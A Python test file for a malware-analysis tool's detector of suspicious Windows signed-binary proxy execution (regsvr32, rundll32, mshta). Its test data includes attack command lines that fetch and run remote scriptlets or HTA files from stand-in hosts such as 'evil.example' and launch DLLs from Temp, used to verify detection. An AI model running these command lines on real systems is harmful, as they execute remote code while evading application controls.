"""LOLBin signed-proxy-execution detection (T1218.010/.011/.005).

Detection must fire on *suspicious* usage only — regsvr32/rundll32 are
ubiquitous and benign, so mere presence must never be flagged.
"""

from __future__ import annotations

from maljan.analysis.lolbin_layer import build_lolbin_isr, classify_lolbin
from maljan.analysis.ttp_cascade import TTPCascadeEngine


def _report(*command_lines: str) -> dict:
    return {"behavior": {"processes": [{"command_line": c} for c in command_lines]}}


class TestClassifyLolbin:
    def test_regsvr32_squiblydoo_flagged(self) -> None:
        assert classify_lolbin("regsvr32 /s /n /u /i:http://evil/a.sct scrobj.dll") == (
            "T1218.010",
            "regsvr32",
        )

    def test_regsvr32_dll_from_temp_flagged(self) -> None:
        assert classify_lolbin(r"regsvr32 /s C:\Users\x\AppData\Local\Temp\eviI.dll") == (
            "T1218.010",
            "regsvr32",
        )

    def test_regsvr32_benign_system32_not_flagged(self) -> None:
        assert classify_lolbin(r"regsvr32 /s C:\Windows\System32\scrrun.dll") is None

    def test_rundll32_javascript_flagged(self) -> None:
        cmd = 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'
        assert classify_lolbin(cmd) == ("T1218.011", "rundll32")

    def test_rundll32_ordinal_export_flagged(self) -> None:
        assert classify_lolbin(r"rundll32 C:\Users\x\AppData\Local\Temp\a.dll,#1") == (
            "T1218.011",
            "rundll32",
        )

    def test_rundll32_benign_not_flagged(self) -> None:
        assert classify_lolbin("rundll32 shell32.dll,Control_RunDLL") is None

    def test_mshta_remote_flagged(self) -> None:
        assert classify_lolbin("mshta http://evil.example/x.hta") == ("T1218.005", "mshta")

    def test_non_lolbin_not_flagged(self) -> None:
        assert classify_lolbin(r"C:\Windows\System32\notepad.exe foo.txt") is None


class TestBuildLolbinIsr:
    def test_builds_isr_with_dynamic_domain_and_windows_platform(self) -> None:
        isr = build_lolbin_isr(_report("mshta http://evil/x.hta"))
        assert isr is not None
        assert isr.domain == "dynamic"
        assert isr.agent_id == "lolbin"
        assert len(isr.claims) == 1
        assert isr.claims[0].technique_id == "T1218.005"
        assert isr.claims[0].rule_platforms == ["windows"]

    def test_dedupes_identical_command_lines(self) -> None:
        isr = build_lolbin_isr(_report("mshta http://evil/x.hta", "mshta http://evil/x.hta"))
        assert isr is not None
        assert len(isr.claims) == 1

    def test_none_when_no_suspicious_lolbin(self) -> None:
        assert build_lolbin_isr(_report("rundll32 shell32.dll,Control_RunDLL")) is None
        assert build_lolbin_isr({}) is None
        assert build_lolbin_isr(None) is None


class TestCascadeIntegration:
    def test_lolbin_technique_surfaces_on_windows_and_drops_on_linux(self) -> None:
        isr = build_lolbin_isr(_report("regsvr32 /i:http://evil/a.sct scrobj.dll"))
        assert isr is not None
        reports = {"lolbin": isr}

        win = TTPCascadeEngine().compute(reports, sample_platform="windows")
        assert any(r.technique_id == "T1218.010" for r in win.results)

        lin = TTPCascadeEngine().compute(reports, sample_platform="linux")
        assert not any(r.technique_id == "T1218.010" for r in lin.results)
